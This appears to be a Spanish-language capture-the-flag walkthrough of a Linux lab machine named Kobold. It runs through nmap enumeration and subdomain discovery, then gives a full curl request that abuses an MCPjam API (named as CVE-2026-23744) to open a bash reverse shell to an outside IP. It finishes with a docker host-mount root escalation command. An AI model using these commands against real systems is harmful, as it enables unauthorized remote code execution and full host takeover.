
OS: Linux

# Enumeración

### Nmap

Hacemos un escaneo inicial para buscar los puertos que están abiertos:

![[Pasted image 20260407192912.png]]

Y posteriormente un escaneo a cada servicio en cada puerto:

```shell
sudo nmap 10.129.245.50 -p22,80,443,3552 -sCV -T5 -v 
```

```ruby
    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 20:10 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating Ping Scan at 20:10
Scanning 10.129.245.50 [4 ports]
Completed Ping Scan at 20:10, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:10
Completed Parallel DNS resolution of 1 host. at 20:10, 0.50s elapsed
Initiating SYN Stealth Scan at 20:10
Scanning 10.129.245.50 [4 ports]
Discovered open port 80/tcp on 10.129.245.50
Discovered open port 22/tcp on 10.129.245.50
Discovered open port 443/tcp on 10.129.245.50
Discovered open port 3552/tcp on 10.129.245.50
Completed SYN Stealth Scan at 20:10, 0.19s elapsed (4 total ports)
Initiating Service scan at 20:10
Scanning 4 services on 10.129.245.50
Completed Service scan at 20:10, 30.14s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.245.50.
Initiating NSE at 20:10
Completed NSE at 20:10, 7.96s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 2.26s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Nmap scan report for 10.129.245.50
Host is up (0.18s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Issuer: commonName=kobold.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-15T15:08:55
| Not valid after:  2125-02-19T15:08:55
| MD5:     c49e c4d5 d4a0 e473 00bc 8df8 cc00 98ac
| SHA-1:   a231 1d00 d15b 2007 eff5 957d 0561 265a bb90 6906
|_SHA-256: 0395 2d40 2b1f 2245 6092 f007 1ae7 6c6d 34d9 0ae3 c04f 271d db92 8907 e4e3 acfe
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3552/tcp open  http     Golang net/http server
|_http-favicon: Unknown favicon MD5: F9C2482A3FE92BDB5276156F46E0D292
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Wed, 08 Apr 2026 00:33:37 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|     <link rel="modu
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Wed, 08 Apr 2026 00:33:38 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|_    <link rel="modu
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3552-TCP:V=7.98%I=7%D=4/7%Time=69D59CE3%P=aarch64-unknown-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ran
SF:ges:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-reval
SF:idate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Wed,\x200
SF:8\x20Apr\x202026\x2000:33:37\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x2
SF:0lang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t
SF:<meta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-stor
SF:e,\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20co
SF:ntent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20conten
SF:t=\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favi
SF:con\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-w
SF:idth,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x
SF:20/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>
SF:\n\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"
SF:\x20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20na
SF:me=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"
SF:\x20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\
SF:x20rel=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ran
SF:ges:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-reval
SF:idate\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Wed,\x200
SF:8\x20Apr\x202026\x2000:33:38\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x2
SF:0lang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t
SF:<meta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-stor
SF:e,\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20co
SF:ntent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20conten
SF:t=\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favi
SF:con\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-w
SF:idth,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x
SF:20/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>
SF:\n\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"
SF:\x20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20na
SF:me=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"
SF:\x20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\
SF:x20rel=\"modu");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.54 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```

# Analisis de la Web

En esta sección empezaremos a analizar la web en busca de vulnerabilidades, primeramente vemos que el dominio es kobold.htb, es necesario agregarlo al /etc/hosts ya que si no lo hacemos no podremos conectarnos a la pagina web:


![[Pasted image 20260407195122.png]]

Lo agregamos en /etc/hosts:

![[Pasted image 20260407195259.png]]

Accediendo a la pagina nos redirige automaticamente  de http a https, ademas vemos que no tiene muchas cosas interesantes:

![[Pasted image 20260407195411.png]]

Haciendo un fuzzeo de directorios no encontramos nada, por lo que podemos buscar por subdominios de ``.kobold.htb``:

![[Pasted image 20260407201920.png]]

Encontramos dos principales (mcp, bin), pero nos enfocaremos en mcp, para ello tendremos que agregarlo a los /etc/hosts:


![[Pasted image 20260408194840.png]]

Ya podemos visitar la pagina:

![[Pasted image 20260408194658.png]]
![[Pasted image 20260407202037.png]]


Vemos una pagina de MCPjam, si le damos a "Add Your First Server", vemos que podemos indicar un comando, ademas la versión 1.4.2v, por lo que es vulnerable a CVE-2026-23744, para explotar esta vulnerabilidad encontramos la siguiente petición (Request) con curl que no consiste mas que una petición a la API de MCPjam:

![[Pasted image 20260408193625.png]]


Tenemos que modificar un poco esta petición con curl para que nos funcione, peor antes tenemos que ponernos a la escucha con NetCat ([[nc]]):

```shell
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"bash\",\"args\":[\"-c\", \"bash -i >& /dev/tcp/10.10.14.77/5555 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}" -k
```

Recibimos la conexión:

![[Pasted image 20260410104210.png]]

Aprovechamos que entramos como el usuario ben para crear un apr de llaves ssh y tener una shell mas util:

![[Pasted image 20260410105519.png]]

Nos conectamos usando la clave privada obtenida:

![[Pasted image 20260410105427.png]]

Ahora debemos escalar privilegios a root, no hacemos parte del grupo de docker, pero podemos auto agregarnos usando `newgrp docker`, ya estando en este grupo es casi como tener privilegios root, ya que podemos volcar todo el sistema desde la raiz a un contenedor con el siguiente comando:

```shell
docker run -v /:/mnt --rm -it mysql:latest chroot /mnt sh
```

![[Pasted image 20260410174214.png]]

# Maquina finalizada
